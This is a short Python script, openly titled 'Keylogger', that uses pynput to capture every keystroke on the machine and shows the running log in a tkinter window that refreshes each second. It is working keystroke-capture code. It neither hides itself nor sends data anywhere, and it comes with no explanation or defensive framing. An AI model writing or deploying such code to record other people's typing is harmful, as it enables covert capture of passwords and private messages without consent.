from pynput import keyboard
from tkinter import *

root = Tk()
root.title("Keylogger")
root.geometry("400x200")

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += " " + str(key) + " "

def update_log():
    global log
    textarea.delete(1.0, END)
    textarea.insert(END, log)
    textarea.after(1000, update_log)

listener = keyboard.Listener(on_press=on_press)
listener.start()

textarea = Text(root, font=("Arial", 12))
textarea.pack(expand=YES, fill=BOTH)

update_log()

root.mainloop()
